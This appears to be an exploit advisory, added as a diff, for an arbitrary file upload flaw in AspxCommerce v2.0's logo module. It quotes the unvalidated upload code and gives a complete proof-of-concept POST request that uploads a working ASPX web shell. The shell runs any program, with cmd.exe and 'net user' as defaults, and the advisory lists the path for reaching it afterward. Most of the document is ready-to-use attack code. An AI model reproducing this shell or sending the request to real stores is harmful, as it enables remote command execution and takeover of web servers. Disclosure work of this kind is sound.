@@ -1,0 +1,125 @@
+# Exploit Title: AspxCommerce v2.0 - Arbitrary File Upload Vulnerability
+# Exploit Author: SANTHO
+# Vendor Homepage: http://www.aspxcommerce.com/
+# Version: Version 2.0 and below
+
+Introduction:
+~~~~~~~~~~~~~
+AspxCommerce is a complete e-Commerce solution for setting up a fully
+functional online store in minutes. It's fully customizable with rich set
+of features.
+You can customize the complete front end, change the look and feel, create
+categories and subcategories, add and modify products, accept payments
+through credit cards and facilitates a lot of other features.
+
+Exploitation Details:
+~~~~~~~~~~~~~~~~~~~~~
+The application doesn't sanitize file extension or content in the Logo
+Editing module. The vulnerability allows a remote attacker to upload files
+via POST method with multiple extensions and access them remotely.
+
+Vulnerable Module : LogoHandler.ashx
+
+Vulnerable Code :
+        string strFileName =
+Path.GetFileName(context.Request.Files[0].FileName);
+        string strExtension =
+Path.GetExtension(context.Request.Files[0].FileName).ToLower();
+        strFileName = strFileName.Substring(0, strFileName.Length -
+strExtension.Length);
+        strFileName = strFileName + '_' + rnd.Next(111111,
+999999).ToString() + strExtension;
+        int strSize = HttpContext.Current.Request.Files[0].ContentLength;
+        string strBaseLocation =
+HttpContext.Current.Server.MapPath("~/Modules/Logo/image/");
+        if (!Directory.Exists(strBaseLocation))
+        {
+            Directory.CreateDirectory(strBaseLocation);
+        }
+        string strSaveLocation = strBaseLocation + strFileName;
+        HttpContext.Current.Request.Files[0].SaveAs(strSaveLocation);
+        retMsg = "Modules/Logo/image/" + strFileName;
+
+
+Proof of Concept:
+~~~~~~~~~~~~~~~~~
+
+POST /Modules/Logo/LogoHandler.ashx HTTP/1.1
+Host: aspxcommerce.localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:23.0) Gecko/20100101
+Firefox/23.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://aspxcommerce.localhost/Sagin/HandleModuleControls.aspx?uid=342&pid=1
+Cookie: nessus-session=false; VisitCount=10; OriginalURL=
+http://aspxcommerce.localhost/; ASP.NET_SessionId=ks51au3fwkgnmtebeznhl245;
+__zlcid=%7B%22mID%22%3A%22L0dAifDhLZG23y%22%2C%22sid%22%3A%22130919.327274.49Hg448a%22%7D;
+OriginalReferrer=http://aspxcommerce.localhost/;
+SageUserRolesCookie=SageUserRolesCookie=Site
+Admin&SageUserRolesProtected=910f0c31-e1dd-42d2-988b-545fe8621544;
+SageFrame.AUTH__1=4374B9AB7C8ACCE26B3DF7734F2DEA168E06E27D8852C0346F86CDB566D2B9D22A256A9C56F561DCFF57A79F473E37DAF19D7E8AFC32D97DE3CAAA0769B8D3FDC604FDCF6768838E3C30E0E9C84974B0373627A00D793AA792590BAB93CF6EF8105E81E156A0DEB1E0910C1BC1583AC69F3FDFEC
+Connection: keep-alive
+Content-Type: multipart/form-data;
+boundary=---------------------------56701790317916
+Content-Length: 1789
+
+-----------------------------56701790317916
+Content-Disposition: form-data; name="myfile[]"; filename="cmd.aspx"
+Content-Type: application/octet-stream
+
+<%@ Page Language="VB" Debug="true" %>
+<%@ import Namespace="system.IO" %>
+<%@ import Namespace="System.Diagnostics" %>
+
+<script runat="server">
+
+Sub RunCmd(Src As Object, E As EventArgs)
+  Dim myProcess As New Process()
+  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)
+  myProcessStartInfo.UseShellExecute = false
+  myProcessStartInfo.RedirectStandardOutput = true
+  myProcess.StartInfo = myProcessStartInfo
+  myProcessStartInfo.Arguments=xcmd.text
+  myProcess.Start()
+
+  Dim myStreamReader As StreamReader = myProcess.StandardOutput
+  Dim myString As String = myStreamReader.Readtoend()
+  myProcess.Close()
+  mystring=replace(mystring,"<","<")
+  mystring=replace(mystring,">",">")
+  result.text= vbcrlf & "<pre>" & mystring & "</pre>"
+End Sub
+
+</script>
+
+<html>
+<body>
+<form runat="server">
+<p><asp:Label id="L_p" runat="server"
+width="80px">Program</asp:Label>
+<asp:TextBox id="xpath" runat="server"
+Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>
+<p><asp:Label id="L_a" runat="server"
+width="80px">Arguments</asp:Label>
+<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c
+net user</asp:TextBox>
+<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px"
+Text="Run"></asp:Button>
+<p><asp:Label id="result" runat="server"></asp:Label>
+</form>
+</body>
+</html>
+-----------------------------56701790317916--
+
+Uploaded Shell's Access Path :
+http://aspxcommerce.localhost/Modules/Logo/image/cmd_134724.aspx
+
+
+
+
+
+-- 
+SANTHO
+twitter : @s4n70 <https://twitter.com/s4n7h0>
